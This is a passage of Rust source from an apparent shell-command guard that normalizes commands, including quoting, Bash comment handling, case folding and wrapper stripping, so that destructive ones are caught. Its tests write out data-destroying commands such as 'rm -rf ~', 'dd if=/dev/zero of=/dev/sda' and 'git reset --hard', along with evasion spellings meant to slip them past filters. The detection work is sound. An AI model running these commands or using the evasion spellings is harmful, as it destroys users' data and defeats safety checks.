                        (Some((Quoted::Double, _)), b'"')
                        | (Some((Quoted::Backquote, _)), b'`')
                        | (Some((Quoted::Braces { .. }, _)), b'}')
                        | (Some((Quoted::Parens(0), _)), b')') => true,
                        (Some((Quoted::Parens(open), _)), b'(') => {
                            *open += 1;
                            false
                        }
                        (Some((Quoted::Parens(open), _)), b')') => {
                            *open -= 1;
                            false
                        }
                        (Some((Quoted::Parens(_) | Quoted::Backquote, _)), b'#')
                            if hash_may_start_comment(bytes, i) =>
                        {
                            return Err(NoReading);
                        }
                        _ => false,
                    };
                    i += 1;
                    if closed && let Some((quoted, start)) = frames.pop() {
                        self.remember(quoted, start, i);
                    }
                }
            }
            if frames.is_empty() {
                return Ok(Some(i));
            }
        }
        if frames.is_empty() {
            return Ok(None);
        }
        // Unclosed: quoted to the end of the span, and of the input when the
        // span ends there.
        if end == bytes.len() {
            for (quoted, start) in frames {
                self.remember(quoted, start, end);
            }
        }
        Ok(Some(end))
    }

    fn remember(&mut self, quoted: Quoted, start: usize, past: usize) {
        if !matches!(quoted, Quoted::Braces { .. }) {
            self.quoted.insert(start, past);
        }
    }

    /// Index past the `)` that closes the `(` at `open`; `None` when none
    /// does. Quoted text counts no parenthesis.
    fn close(&mut self, open: usize) -> Result<Option<usize>, NoReading> {
        if let Some(close) = self.closes.get(&open) {
            return Ok(*close);
        }
        if self.spent > self.budget {
            return Err(NoReading);
        }
        let bytes = self.bytes;
        self.closes.clear();
        let mut opens: Vec<usize> = Vec::new();
        let mut i = open;
        while i < bytes.len() {
            if let Some(past) = self.quoted_end(i, bytes.len())? {
                i = past;
                continue;
            }
            self.spent += 1;
            match bytes[i] {
                b'(' => opens.push(i),
                b')' => {
                    if let Some(at) = opens.pop() {
                        self.closes.insert(at, Some(i + 1));
                    }
                    if opens.is_empty() {
                        return Ok(Some(i + 1));
                    }
                }
                _ => {}
            }
            i += 1;
        }
        self.closes.extend(opens.into_iter().map(|at| (at, None)));
        Ok(None)
    }

    /// Where the arithmetic that the `((` (or `$((`) whose second `(` is at
    /// `second` opens ends; `None` when it opens none. Bash (and
    /// `context::arithmetic_end`) reads arithmetic when the `)` closing
    /// `second` is followed at once by another `)`; otherwise (`((cd x) &&
    /// ls)`) the parentheses open nested subshells.
    fn arithmetic(&mut self, second: usize) -> Result<Option<usize>, NoReading> {
        Ok(self
            .close(second)?
            .filter(|close| self.bytes.get(*close) == Some(&b')'))
            .map(|close| close + 1))
    }

    /// End of the `[[` operand word that starts at `start`: the first blank,
    /// `;`, `&` or `)` outside quoted text and its parentheses, where Bash
    /// keeps blanks in the word.
    fn operand_word_end(&mut self, start: usize) -> Result<usize, NoReading> {
        let bytes = self.bytes;
        let mut depth = 0usize;
        let mut i = start;
        while i < bytes.len() {
            if let Some(past) = self.quoted_end(i, bytes.len())? {
                i = past;
                continue;
            }
            match bytes[i] {
                b'(' => depth += 1,
                b')' if depth > 0 => depth -= 1,
                b' ' | b'\t' | b'\n' | b';' | b'&' | b')' if depth == 0 => break,
                _ => {}
            }
            i += 1;
        }
        Ok(i.min(bytes.len()))
    }

    /// Spell `_` each `#` in `start..end` outside quoted text that may start
    /// a comment; with `in_groups_only`, only those inside parentheses (the
    /// groups of a pattern word).
    fn spell_hashes(
        &mut self,
        start: usize,
        end: usize,
        in_groups_only: bool,
        spelled: &mut Option<Vec<u8>>,
    ) -> Result<(), NoReading> {
        let bytes = self.bytes;
        let mut depth = 0usize;
        let mut i = start;
        while i < end {
            if let Some(past) = self.quoted_end(i, end)? {
                i = past;
                continue;
            }
            match bytes[i] {
                b'(' => depth += 1,
                b')' => depth = depth.saturating_sub(1),
                b'#' if (depth > 0 || !in_groups_only) && hash_may_start_comment(bytes, i) => {
                    spelled.get_or_insert_with(|| bytes.to_vec())[i] = b'_';
                }
                _ => {}
            }
            i += 1;
        }
        Ok(())
    }
}

/// What starts at a byte for [`SpanReader::quoted_end`].
enum QuoteOpen {
    /// Quoted text read whole, which ends before this index.
    Skip(usize),
    /// Quoted text that may nest more, and where its body starts.
    Push(Quoted, usize),
}

/// The quoted text that starts at `i` inside `context` (`None`: unquoted
/// text), if any.
fn quote_opens(bytes: &[u8], i: usize, context: Option<Quoted>) -> Option<QuoteOpen> {
    let next = |at: usize| past_line_continuations(bytes, at);
    let double = context == Some(Quoted::Double);
    let quoted_braces = context == Some(Quoted::Braces { quoted: true });
    // Bash and zsh end a backquoted command at the first unescaped
    // backquote: nothing nests in it, not even a quote.
    if context == Some(Quoted::Backquote) {
        return (bytes[i] == b'\\').then_some(QuoteOpen::Skip(i + 2));
    }
    match bytes[i] {
        b'\\' => Some(QuoteOpen::Skip(i + 2)),
        b'$' if bytes.get(next(i + 1)) == Some(&b'$') => Some(QuoteOpen::Skip(next(i + 1) + 1)),
        b'$' if bytes.get(next(i + 1)) == Some(&b'(') => {
            Some(QuoteOpen::Push(Quoted::Parens(0), next(i + 1) + 1))
        }
        b'$' if bytes.get(next(i + 1)) == Some(&b'{') => Some(QuoteOpen::Push(
            Quoted::Braces {
                quoted: double || quoted_braces,
            },
            next(i + 1) + 1,
        )),
        b'`' => Some(QuoteOpen::Push(Quoted::Backquote, i + 1)),
        b'"' if !double => Some(QuoteOpen::Push(Quoted::Double, i + 1)),
        b'$' if !double && crate::context::ansi_c_quote_starts_at(bytes, i) => Some(
            QuoteOpen::Skip(crate::context::skip_ansi_c_quoted(bytes, i + 2)),
        ),
        b'\'' if !double && !quoted_braces => Some(QuoteOpen::Skip(
            memchr::memchr(b'\'', &bytes[i + 1..]).map_or(bytes.len(), |at| i + at + 2),
        )),
        _ => None,
    }
}

/// What [`bash_hashes_as_data`] is inside of.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Frame {
    /// A double-quoted string.
    Double,
    /// A `$(…)`, `<(…)` or `>(…)` body, with the parentheses open in it.
    Substitution(usize),
    /// A `${…}`, and whether it is in double quotes, where a `'` in it is a
    /// literal.
    Braces { quoted: bool },
}

/// Index of the first byte at or after `at` that does not start a `\`LF pair
/// (a line continuation, which Bash removes before it reads tokens).
fn past_line_continuations(bytes: &[u8], mut at: usize) -> usize {
    while bytes.get(at) == Some(&b'\\') && bytes.get(at + 1) == Some(&b'\n') {
        at += 2;
    }
    at
}

/// The byte Bash reads right before index `at` once line continuations are
/// removed; `None` at the start. A `\`LF pair is one only when its `\` is not
/// escaped and it starts at or after `floor` (an earlier one ends a comment).
fn byte_before(bytes: &[u8], mut at: usize, floor: usize) -> Option<u8> {
    while at >= floor + 2
        && bytes[at - 1] == b'\n'
        && bytes[at - 2] == b'\\'
        && bytes[..at - 2]
            .iter()
            .rev()
            .take_while(|b| **b == b'\\')
            .count()
            % 2
            == 0
    {
        at -= 2;
    }
    at.checked_sub(1).map(|before| bytes[before])
}

/// Whether Bash starts a token at index `at`: after a blank, a newline, an
/// operator byte or a backquote, once line continuations are removed.
fn token_starts_at(bytes: &[u8], at: usize, floor: usize) -> bool {
    byte_before(bytes, at, floor).is_none_or(|before| {
        matches!(
            before,
            b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>' | b'`'
        )
    })
}

/// Index of the `(` that follows the `(` at `open` once line continuations
/// are skipped.
fn second_open_paren(bytes: &[u8], open: usize) -> Option<usize> {
    let at = past_line_continuations(bytes, open + 1);
    (bytes.get(at) == Some(&b'(')).then_some(at)
}

/// The `[[` operator at `at` that takes a pattern (`==`, `=`, `!=`) or a
/// regex (`=~`, the `true`) word, with the index after it; `None` when there
/// is none. A blank follows it; a regex operator may also be followed by a
/// `(` or `|`, where its word starts.
fn conditional_operator(bytes: &[u8], at: usize) -> Option<(bool, usize)> {
    let second = past_line_continuations(bytes, at + 1);
    let (regex, after) = match (bytes[at], bytes.get(second)) {
        (b'=', Some(b'~')) => (true, past_line_continuations(bytes, second + 1)),
        (b'=' | b'!', Some(b'=')) => (false, past_line_continuations(bytes, second + 1)),
        (b'=', _) => (false, second),
        _ => return None,
    };
    match bytes.get(after) {
        None | Some(b' ' | b'\t' | b'\n') => Some((regex, after)),
        Some(b'(' | b'|') if regex => Some((regex, after)),
        _ => None,
    }
}

/// Whether the `#` at `at` follows a blank or an operator byte; one after a
/// word byte starts no comment to any reader.
fn hash_may_start_comment(bytes: &[u8], at: usize) -> bool {
    at > 0
        && (bytes[at - 1].is_ascii_whitespace()
            || matches!(
                bytes[at - 1],
                b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>' | b'`'
            ))
}

/// `command` with every program name it spells in a case other than lower
/// case folded to lower case, or `None` when it spells none.
///
/// A case-insensitive filesystem (macOS by default, Windows) runs `/bin/rm`
/// for `RM`, `Rm` or `/bin/RM`, and every name the packs and the shell
/// analysis compare is a lower-case one, so `RM -rf ~` or `sSH host '…'`
/// matched nothing. The evaluator also reads this view, on every platform:
/// a name that is folded runs the same program in it.
///
/// A program name here is a word (a run of letters, digits and `._+-`, with
/// quotes and backslashes inside it removed, as the shell removes them, and a
/// `.exe` suffix ignored) whose lower-case form an enabled pack keys on or
/// dcg's own analysis recognizes (see [`STRUCTURAL_PROGRAM_NAMES`]). The last
/// part of a word a backslash splits counts too, as a Windows path ends in
/// it. Arguments that are no program name keep their case: unlike program
/// names, they mean what their case says. Heredoc bodies are left as they
/// are: a body is data, or a script read on its own (where this applies
/// again), and folding its words could only cost time. Only text that every
/// shell reads as a body is left out (see
/// [`crate::context::undisputed_heredoc_body_ranges`]): what one shell reads
/// as a body may be commands to another.
///
/// Length preserving (ASCII case folding), so every range in the view is the
/// same range in `command`.
#[must_use]
pub(crate) fn fold_program_name_case(command: &str, enabled_keywords: &[&str]) -> Option<String> {
    let bytes = command.as_bytes();
    if !bytes.iter().any(u8::is_ascii_uppercase) {
        return None;
    }
    let is_name_byte =
        |byte: u8| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'+' | b'-');
    let is_transparent = |byte: u8| matches!(byte, b'\'' | b'"' | b'\\');
    let mut bodies = crate::context::undisputed_heredoc_body_ranges(command)
        .into_iter()
        .peekable();
    let mut folded: Option<Vec<u8>> = None;
    let mut i = 0usize;
    while i < bytes.len() {
        if let Some(body) = bodies.peek() {
            if i >= body.end {
                bodies.next();
                continue;
            }
            if i >= body.start {
                i = body.end;
                continue;
            }
        }
        if !is_name_byte(bytes[i]) && !is_transparent(bytes[i]) {
            i += 1;
            continue;
        }
        let start = i;
        let limit = bodies.peek().map_or(bytes.len(), |body| body.start);
        while i < limit && (is_name_byte(bytes[i]) || is_transparent(bytes[i])) {
            i += 1;
        }
        let run = &bytes[start..i];
        if !run.iter().any(u8::is_ascii_uppercase) {
            continue;
        }
        // The word right after a `<<`/`<<-` heredoc operator is a delimiter,
        // never a program name. Folding it (e.g. `PERL`/`SH`/`PHP`, which
        // spell the recognized `perl`/`sh`/`php`) would desync the opening
        // delimiter from its terminator, which sits in the body this view
        // leaves alone, and the re-parse of the broken heredoc reads the body
        // as top-level code. A here-string (`<<<`) carries data, not a
        // delimiter, so it keeps folding as before.
        let after_heredoc_operator = {
            let mut p = start;
            while p > 0 && matches!(bytes[p - 1], b' ' | b'\t') {
                p -= 1;
            }
            if p > 0 && bytes[p - 1] == b'-' {
                p -= 1;
            }
            p >= 2 && &bytes[p - 2..p] == b"<<" && !(p >= 3 && bytes[p - 3] == b'<')
        };
        if after_heredoc_operator {
            continue;
        }
        let name_of = |part: &[u8]| -> Vec<u8> {
            let mut name: Vec<u8> = part
                .iter()
                .filter(|byte| !is_transparent(**byte))
                .map(u8::to_ascii_lowercase)
                .collect();
            if name.len() > 4 && name.ends_with(b".exe") {
                name.truncate(name.len() - 4);
            }
            name
        };
        let fold = if is_recognized_program_name(&name_of(run), enabled_keywords) {
            Some(start..i)
        } else {
            // A Windows path: the part after its last backslash.
            run.iter()
                .rposition(|byte| *byte == b'\\')
                .map(|at| start + at + 1..i)
                .filter(|last| {
                    let name = name_of(&bytes[last.clone()]);
                    !name.is_empty() && is_recognized_program_name(&name, enabled_keywords)
                })
        };
        if let Some(range) = fold {
            folded.get_or_insert_with(|| bytes.to_vec())[range].make_ascii_lowercase();
        }
    }
    folded.map(|view| String::from_utf8(view).expect("ASCII case folding keeps UTF-8"))
}

/// Strip leading backslash from the first command token.
///
/// This handles bash alias bypass: `\git` instead of `git`.
/// Also handles Windows-style commands like `\git.exe`.
fn strip_leading_backslash(command: &str) -> Option<(String, StrippedWrapper)> {
    let trimmed = command.trim_start();
    if !trimmed.starts_with('\\') {
        return None;
    }

    // Get the first token (command name)
    let rest = &trimmed[1..];
    if rest.is_empty() {
        return None;
    }

    // Find end of first token
    let first_word_end = rest.find(char::is_whitespace).unwrap_or(rest.len());

    let first_word = &rest[..first_word_end];

    // Only strip if the token looks like a valid command name
    // Allow alphanumeric, underscore, dash, and dot (for .exe extensions)
    if first_word.is_empty()
        || !first_word
            .chars()
            .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.')
    {
        return None;
    }

    Some((
        rest.to_string(),
        StrippedWrapper {
            wrapper_type: "backslash",
            stripped_text: "\\".to_string(),
        },
    ))
}

#[cfg(test)]
mod tests {
    #[test]
    fn braced_parameter_is_one_word_across_shell_punctuation() {
        for word in [
            "${x:+)}",
            "${x//)}",
            "${x:-${y:+(}}",
            "pre${x:-'a ) b'}post",
            "\"${x:-a ) b}\"",
            "$(echo ${x:+)})",
        ] {
            let line = format!("{word}; next");
            assert_eq!(
                super::consume_word_token(line.as_bytes(), 0, line.len()),
                word.len(),
                "{line}"
            );
        }
    }

    /// A `${` that no `}` closes is read to the end once per tokenization or
    /// wrapper parse; later ones are plain, so a run of them, in one word, in
    /// quotes or one per word, stays linear (64 KB took up to 21 s) and the
    /// separator after them is still found.
    #[test]
    fn unclosed_braced_parameters_are_read_in_linear_time() {
        let started = std::time::Instant::now();
        for command in [
            format!("echo {}; ls", "${".repeat(100_000)),
            format!("echo \"{}\"; ls", "${".repeat(100_000)),
            format!("echo {}; ls", "${a ".repeat(50_000)),
        ] {
            for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
                let tokens = tokenize_for_shell_dialect(&command, dialect);
                let tail: Vec<&str> = tokens
                    .iter()
                    .rev()
                    .take(2)
                    .map(|token| &command[token.byte_range.clone()])
                    .collect();
                assert_eq!(tail, ["ls", ";"], "{dialect:?}");
            }
        }
        // The wrapper and assignment-prefix parsers read one word at a time.
        for command in [
            format!("env {}git status", "A=${a ".repeat(30_000)),
            format!("sudo {}git status", "-u ${a ".repeat(30_000)),
            format!("{}git status", "A=${a ".repeat(30_000)),
        ] {
            let _ = strip_wrapper_prefixes(&command);
        }
        assert!(
            started.elapsed() < std::time::Duration::from_secs(2),
            "{:?}",
            started.elapsed()
        );
    }

    /// A `#` inside `${…}` is data in the POSIX tokenizer: the blank before it
    /// ends no word, so no comment starts. After the `}` a comment starts again.
    #[test]
    fn posix_tokenizer_keeps_braced_parameter_whole() {
        let words = |command: &str| -> Vec<String> {
            tokenize_for_shell_dialect(command, ShellDialect::Posix)
                .iter()
                .map(|token| {
                    let kind = match token.kind {
                        NormalizeTokenKind::Separator => "sep",
                        _ => "word",
                    };
                    format!("{kind}:{}", &command[token.byte_range.clone()])
                })
                .collect()
        };
        for (command, expected) in [
            (
                "x=${y:- #}; git status",
                vec!["word:x=${y:- #}", "sep:;", "word:git", "word:status"],
            ),
            (
                "x=${y:-\t#}; ls",
                vec!["word:x=${y:-\t#}", "sep:;", "word:ls"],
            ),
            ("x=${y/ #/} ls", vec!["word:x=${y/ #/}", "word:ls"]),
            (
                "x=${y:-${z:- #} #}; ls",
                vec!["word:x=${y:-${z:- #} #}", "sep:;", "word:ls"],
            ),
            (
                "x=${y:-\"a #\"}; ls",
                vec!["word:x=${y:-\"a #\"}", "sep:;", "word:ls"],
            ),
            (
                "x=${y:-$(echo a)} #c\nls",
                vec!["word:x=${y:-$(echo a)}", "sep:\n", "word:ls"],
            ),
            (
                "echo \"${y:-\" #\"}\"; ls",
                vec!["word:echo", "word:\"${y:-\" #\"}\"", "sep:;", "word:ls"],
            ),
            (
                "echo \"${y:-it's}\"; ls",
                vec!["word:echo", "word:\"${y:-it's}\"", "sep:;", "word:ls"],
            ),
            // No closing `}`: read as before, the `;` still separates.
            (
                "echo ${y:- ; ls",
                vec!["word:echo", "word:${y:-", "sep:;", "word:ls"],
            ),
        ] {
            assert_eq!(words(command), expected, "{command:?}");
        }
    }

    use super::*;

    #[test]
    fn backslashes_are_spelled_as_slashes_only_where_that_moves_a_command_boundary() {
        for (command, spelled) in [
            (r#"echo "C:\temp\"; x"#, r#"echo "C:/temp/"; x"#),
            (r"echo a\; x", "echo a/; x"),
            (r#"echo "a\" | x"#, r#"echo "a/" | x"#),
            ("echo \"a\\\"\nx", "echo \"a/\"\nx"),
        ] {
            assert_eq!(
                without_backslash_escapes(command).as_deref(),
                Some(spelled),
                "{command:?}"
            );
        }
        for command in [
            "git status",
            r"cd C:\Users\kaita\repo",
            r#"Write-Output "C:\temp\""#,
            r#"git -C "C:\Users\kaita\repo\" status"#,
            r#"gh pr comment 1 --body "see \$(id)""#,
            r"echo a\>b",
        ] {
            assert_eq!(without_backslash_escapes(command), None, "{command:?}");
        }
    }

    fn raw_token_snapshot(
        command: &str,
        dialect: ShellDialect,
    ) -> Vec<(NormalizeTokenKind, String)> {
        tokenize_for_shell_dialect(command, dialect)
            .iter()
            .map(|token| {
                (
                    token.kind,
                    token
                        .text(command)
                        .expect("token range must slice its source command")
                        .to_string(),
                )
            })
            .collect()
    }

    #[test]
    fn posix_assignment_words_follow_shell_identifier_rules() {
        for word in [
            "FOO=bar",
            "_FOO=",
            "PATH+=:/tmp/tools",
            "CACHE[0]=warm",
            "CACHE[key]+=warm",
        ] {
            assert!(is_env_assignment(word), "valid assignment rejected: {word}");
        }
        for word in [
            "",
            "=value",
            "9FOO=value",
            "-FOO=value",
            "FOO-BAR=value",
            "FOO[=value",
            "FOO[]=value",
            "FOO]x[0]=value",
        ] {
            assert!(
                !is_env_assignment(word),
                "non-assignment accepted as a prefix: {word}"
            );
        }
    }

    #[test]
    fn execution_frontends_normalize_to_the_invoked_command() {
        for command in [
            "nice rm -rf /data",
            "nice -n 5 rm -rf /data",
            "ionice -tc3 rm -rf /data",
            "setsid -fw rm -rf /data",
            "timeout --signal KILL 10 rm -rf /data",
            "stdbuf -o0 rm -rf /data",
            "chrt -o 0 rm -rf /data",
            "busybox timeout 5 rm -rf /data",
            "PATH+=:/tmp/tools timeout 5 nice rm -rf /data",
        ] {
            assert_eq!(
                strip_wrapper_prefixes(command).normalized,
                "rm -rf /data",
                "wrapper chain was not normalized: {command}"
            );
        }
    }

    #[test]
    fn non_executing_frontend_modes_are_not_stripped() {
        for command in [
            "nice --help rm -rf /data",
            "ionice -p 123 rm -rf /data",
            "setsid --version rm -rf /data",
            "timeout --help 5 rm -rf /data",
            "chrt --pid 0 123 rm -rf /data",
            "stdbuf --help rm -rf /data",
        ] {
            assert!(
                !strip_wrapper_prefixes(command).was_normalized(),
                "informational/process mode was treated as command execution: {command}"
            );
        }
    }

    /// Program names a pack keys on or the analysis recognizes are folded to
    /// lower case wherever a word spells one, through quotes, backslashes, a
    /// directory and a `.exe` suffix; flags, other words and heredoc bodies
    /// keep their case, and the view keeps the command's length.
    #[test]
    fn program_names_fold_to_lower_case() {
        let keywords = ["rm", "git", "dd"];
        for (command, folded) in [
            ("RM -rf ~", "rm -rf ~"),
            ("Rm -rf ~", "rm -rf ~"),
            ("/bin/RM -rf ~", "/bin/rm -rf ~"),
            ("\"RM\" -rf ~", "\"rm\" -rf ~"),
            ("R\\M -rf ~", "r\\m -rf ~"),
            ("C:\\Tools\\RM.EXE -rf x", "C:\\Tools\\rm.exe -rf x"),
            ("SUDO RM -rf ~", "sudo rm -rf ~"),
            ("echo ~ | XARGS RM -rf", "echo ~ | xargs rm -rf"),
            ("sSH host 'RM -rf ~'", "ssh host 'rm -rf ~'"),
            ("Python3.12 -c 'x'", "python3.12 -c 'x'"),
            ("DD if=/dev/zero of=/dev/sda", "dd if=/dev/zero of=/dev/sda"),
            (
                "cat <<'EOF' >notes\nRM -rf ~\nEOF\nRM x",
                "cat <<'EOF' >notes\nRM -rf ~\nEOF\nrm x",
            ),
        ] {
            let view = fold_program_name_case(command, &keywords);
            assert_eq!(view.as_deref(), Some(folded), "{command:?}");
            assert_eq!(folded.len(), command.len());
        }
        for command in [
            "rm -RF ~",
            "git branch -D Feature",
            "RM_DIR=build make",
            "LS -la",
            "Get-ChildItem -Path C:\\",
            "rm -rf ~",
            "cat <<'EOF'\nRM -rf ~\nEOF",
        ] {
            assert_eq!(
                fold_program_name_case(command, &keywords),
                None,
                "{command:?}"
            );
        }
        // A command word spelled with escapes is read with its base name in
        // lower case too.
        for command in ["$'\\x52\\x4d' -rf ~", "/bin/$'\\x52M' -rf ~"] {
            let normalized = normalize_command_in_dialect(command, ShellDialect::Posix);
            assert!(
                normalized.contains("rm -rf ~"),
                "{command:?} -> {normalized:?}"
            );
        }
    }

    /// A heredoc delimiter is left alone even when it spells a program name
    /// (`PERL`/`SH`/`PHP`). Folding only the opening delimiter desynced it from
    /// its terminator in the body and corrupted the re-parse, so benign
    /// quoted-heredoc programs read as top-level writes.
    #[test]
    fn heredoc_delimiters_are_not_folded_even_when_they_spell_a_program_name() {
        // No other foldable word, so the whole command has nothing to fold.
        for command in [
            "perl <<'PERL'\nprint 1\nPERL",
            "bash <<'SH'\nfor i in 1 2 3; do echo hi > \"/tmp/x/$i\"; done\nSH",
            "cat <<'PHP' | php\n<?php echo 'x'; ?>\nPHP",
            "cat <<-'RUBY'\n\tputs 1\n\tRUBY",
            "cat << PERL\nhi\nPERL",
        ] {
            assert_eq!(fold_program_name_case(command, &[]), None, "{command:?}");
        }
        // The leading program word still folds; only the delimiter is spared.
        assert_eq!(
            fold_program_name_case("PERL <<'PERL'\nx\nPERL", &[]).as_deref(),
            Some("perl <<'PERL'\nx\nPERL"),
        );
        // A here-string (`<<<`) carries data, not a delimiter, so it folds.
        assert_eq!(
            fold_program_name_case("x <<<SH", &[]).as_deref(),
            Some("x <<<sh"),
        );
    }

    /// PowerShell ends a line at a lone CR; CRLF and LF are line breaks to
    /// every reader already, and other line-like characters end no line.
    #[test]
    fn powershell_lone_carriage_returns_are_spelled_as_line_feeds() {
        for (command, spelled) in [
            ("echo a\rgit reset --hard", "echo a\ngit reset --hard"),
            ("a\r\rb\r", "a\n\nb\n"),
            ("a\r\r\nb", "a\n\r\nb"),
            ("Write-Output 'x\ry'", "Write-Output 'x\ny'"),
            ("\u{e9}\r\u{2028}", "\u{e9}\n\u{2028}"),
        ] {
            assert_eq!(
                powershell_line_breaks_as_line_feeds(command).as_deref(),
                Some(spelled),
                "{command:?}"
            );
        }
        for command in [
            "echo a\ngit reset --hard",
            "echo a\r\ngit reset --hard",
            "echo a\u{85}git reset --hard",
            "echo a\u{2028}git reset --hard",
            "echo a\u{2029}git reset --hard",
            "echo a\u{b}git reset --hard",
            "echo a\u{c}git reset --hard",
            "",
        ] {
            assert_eq!(
                powershell_line_breaks_as_line_feeds(command),
                None,
                "{command:?}"
            );
        }
    }

    /// Bash reads `#` inside an arithmetic command as data, where the shared
    /// readers may take it for a comment; only those bytes are spelled.
    #[test]
    fn bash_data_hashes_are_spelled_as_data() {
        for (command, spelled) in [
            (
                "(( x = 1 #)); git reset --hard",
                "(( x = 1 _)); git reset --hard",
            ),
            ("((x=1 #))&& git clean -fdx", "((x=1 _))&& git clean -fdx"),
            (
                "(( 1 \n #)); git reset --hard",
                "(( 1 \n _)); git reset --hard",
            ),
            (
                "for ((i=0;i<1;i++ #)); do :; done; git reset --hard",
                "for ((i=0;i<1;i++ _)); do :; done; git reset --hard",
            ),
            (
                "if (( 1 #)); then :; fi; git reset --hard",
                "if (( 1 _)); then :; fi; git reset --hard",
            ),
            ("x; (( 1 #(2) ))", "x; (( 1 _(2) ))"),
            (
                "echo $( (( 1 #)); git reset --hard )",
                "echo $( (( 1 _)); git reset --hard )",
            ),
            (
                "echo \"$( (( 1 #)); git reset --hard )\"",
                "echo \"$( (( 1 _)); git reset --hard )\"",
            ),
            (
                "echo `(( 1 #)); git reset --hard`",
                "echo `(( 1 _)); git reset --hard`",
            ),
            (
                "echo $(((1 #)); git reset --hard)",
                "echo $(((1 _)); git reset --hard)",
            ),
            // A quote in the arithmetic is read as Bash reads it.
            (
                "(( 1 #'x' )); git reset --hard",
                "(( 1 _'x' )); git reset --hard",
            ),
            ("(( 1 #'#' ))", "(( 1 _'#' ))"),
            // `((` needs no word start; `|` stays in a `=~` word; `\`LF is skipped.
            (
                "for((i=0;i<1;i++ #));do :;done;git reset --hard",
                "for((i=0;i<1;i++ _));do :;done;git reset --hard",
            ),
            ("case x in x)((1 #));;esac", "case x in x)((1 _));;esac"),
            (
                "(\\\n( 1 #)); git reset --hard",
                "(\\\n( 1 _)); git reset --hard",
            ),
            (
                "[[ x =~ a|( #) ]]; git reset --hard",
                "[[ x =~ a|( _) ]]; git reset --hard",
            ),
            (
                "[[ x =~|( #) ]]; git reset --hard",
                "[[ x =~|( _) ]]; git reset --hard",
            ),
            // `)` is a metacharacter, so a `[[` after it opens a conditional.
            (
                "case x in x)[[ x =~ ( #) ]];;esac;git reset --hard",
                "case x in x)[[ x =~ ( _) ]];;esac;git reset --hard",
            ),
            (
                "f()[[ x =~ ( #) ]];git reset --hard",
                "f()[[ x =~ ( _) ]];git reset --hard",
            ),
            // A group in a `=~` regex keeps its blanks in the word.
            (
                "[[ x =~ ( #) ]]; git reset --hard",
                "[[ x =~ ( _) ]]; git reset --hard",
            ),
            (
                "[[ x =~ ((a) #) ]]; git reset --hard",
                "[[ x =~ ((a) _) ]]; git reset --hard",
            ),
            (
                "[[ -n x && x =~ (a| #'b') ]]",
                "[[ -n x && x =~ (a| _'b') ]]",
            ),
            // Bash removes each `\`LF pair before it reads tokens.
            (
                "[[ x =~ \\\n ( #) ]]; git reset --hard",
                "[[ x =~ \\\n ( _) ]]; git reset --hard",
            ),
            (
                "[[ x =~\\\n( #) ]]; git reset --hard",
                "[[ x =~\\\n( _) ]]; git reset --hard",
            ),
            (
                "[\\\n[ x =~ ( #) ]]; git reset --hard",
                "[\\\n[ x =~ ( _) ]]; git reset --hard",
            ),
            (
                "[[\\\n x =~ ( #) ]]; git reset --hard",
                "[[\\\n x =~ ( _) ]]; git reset --hard",
            ),
            (
                "[[ x =\\\n~ ( #) ]]; git reset --hard",
                "[[ x =\\\n~ ( _) ]]; git reset --hard",
            ),
            (
                "if [[ x =~ \\\n( #) ]]; then :; fi; git reset --hard",
                "if [[ x =~ \\\n( _) ]]; then :; fi; git reset --hard",
            ),
            (
                "for\\\n((i=0;i<1;i++ #));do :;done;git reset --hard",
                "for\\\n((i=0;i<1;i++ _));do :;done;git reset --hard",
            ),
            // `x\`LF`#` is the word `x#`: its `#` is data.
            (
                ": x\\\n# ; (( 1 #)); git reset --hard",
                ": x\\\n_ ; (( 1 _)); git reset --hard",
            ),
            // Bash 5.3 skips a newline before a `=~` word.
            (
                "[[ x =~\n( #) ]]; git reset --hard",
                "[[ x =~\n( _) ]]; git reset --hard",
            ),
            // Pattern groups: `[[` operands, and `extglob` groups anywhere.
            (
                "[[ x == @( #) ]]; git reset --hard",
                "[[ x == @( _) ]]; git reset --hard",
            ),
            (
                "[[ x == +( #) ]]; git reset --hard",
                "[[ x == +( _) ]]; git reset --hard",
            ),
            (
                "[[ x = x@( #) ]]; git reset --hard",
                "[[ x = x@( _) ]]; git reset --hard",
            ),
            (
                "[[ x == *( #) ]] || git reset --hard",
                "[[ x == *( _) ]] || git reset --hard",
            ),
            (
                "[[ x == ?( #) ]]; git reset --hard",
                "[[ x == ?( _) ]]; git reset --hard",
            ),
            (
                "[[ x != !( #) ]] || git reset --hard",
                "[[ x != !( _) ]] || git reset --hard",
            ),
            (
                "[[ x == ( #) ]]; git reset --hard",
                "[[ x == ( _) ]]; git reset --hard",
            ),
            (
                "[[ x == (a| #) ]]; git reset --hard",
                "[[ x == (a| _) ]]; git reset --hard",
            ),
            (
                "shopt -s extglob\n: @( #); git reset --hard",
                "shopt -s extglob\n: @( _); git reset --hard",
            ),
            (
                "echo x*( #); git reset --hard",
                "echo x*( _); git reset --hard",
            ),
            (
                "case x in @( #)) :;; esac; git reset --hard",
                "case x in @( _)) :;; esac; git reset --hard",
            ),
            ("x\\\n#; git reset --hard", "x\\\n_; git reset --hard"),
            // Every span reader reads `$'…'` and backquotes as quoted text.
            (
                "[[ x =~ $'\\'' ]]; (( 1 #)); git reset --hard",
                "[[ x =~ $'\\'' ]]; (( 1 _)); git reset --hard",
            ),
            (
                "(( 1 $'\\'' #)); git reset --hard",
                "(( 1 $'\\'' _)); git reset --hard",
            ),
            (
                "(( `echo )` + 1 #)); git reset --hard",
                "(( `echo )` + 1 _)); git reset --hard",
            ),
            (
                "[[ x == @( `echo )` #) ]]; git reset --hard",
                "[[ x == @( `echo )` _) ]]; git reset --hard",
            ),
            // A backquoted command ends at the first unescaped backquote.
            (
                "(( `: '` + 1 #)); git reset --hard\n: '`'",
                "(( `: '` + 1 _)); git reset --hard\n: '`'",
            ),
            (
                "[[ x =~ ( `: '` #) ]]; git reset --hard\n: '`'",
                "[[ x =~ ( `: '` _) ]]; git reset --hard\n: '`'",
            ),
            (
                "(( \"$(echo \")\")\" + 1 #)); git reset --hard",
                "(( \"$(echo \")\")\" + 1 _)); git reset --hard",
            ),
            (
                "echo $\\\n( (( 1 #)); git reset --hard )",
                "echo $\\\n( (( 1 _)); git reset --hard )",
            ),
        ] {
            assert_eq!(
                bash_spelling(command).as_deref(),
                Some(spelled),
                "{command:?}"
            );
        }
        for command in [
            "(( x = 1 )); git status",
